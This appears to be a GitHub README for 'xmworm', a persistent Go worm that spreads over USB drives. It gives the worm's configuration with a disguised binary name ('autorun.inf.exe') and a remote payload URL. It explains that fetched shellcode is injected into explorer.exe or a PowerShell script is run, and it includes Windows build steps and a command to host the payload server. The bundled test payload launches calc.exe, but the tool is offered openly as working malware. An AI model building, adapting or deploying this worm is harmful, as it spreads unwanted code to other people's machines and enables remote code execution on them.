# xmworm
A persistent Go based USB spreading worm, with remote payload fetching ability


# setup


## Configure

```sh
$ vim main.go
```

```golang
// main.go

func main(){
	
	worm := &Worm{
		binaryName: "autorun.inf.exe", 
		maxScanInterval: 5,
		//payloadURL: "http://localhost:8005/dropper.ps1",

		// https://www.exploit-db.com/shellcodes/49819
		// `payload.bin` is in `payload/payload.bin` sub-directory,
		// it is raw-binary shellcode that pops calc.exe
		payloadUrl: "http://localhost:8005/payload.bin",
		payloadType: "shellcode",
	}
```

Set the payload url, and payload type you want in the worm's config structure.

- there are currently two supported payload types: `powershell`, and `shellcode`
- `powershell` is simple powershell script
- `shellcode` is raw binary shellcode, which will be loaded in explorer.exe on target system
	- explorer.exe is opened first, then shellcode loaded in it.
	- `payload/payload.bin` is a test payload that pops calc.exe, ref: https://www.exploit-db.com/shellcodes/49819

## Build

```sh
git clone https://github.com/r0psteev/xmworm.git

cd ./xmworm

GOOS=windows GOARCH=amd64 go build .
```

## Start webserver on embedded test payloads

```sh

$ cd ./payload
$ python3 -m http.server 8005
```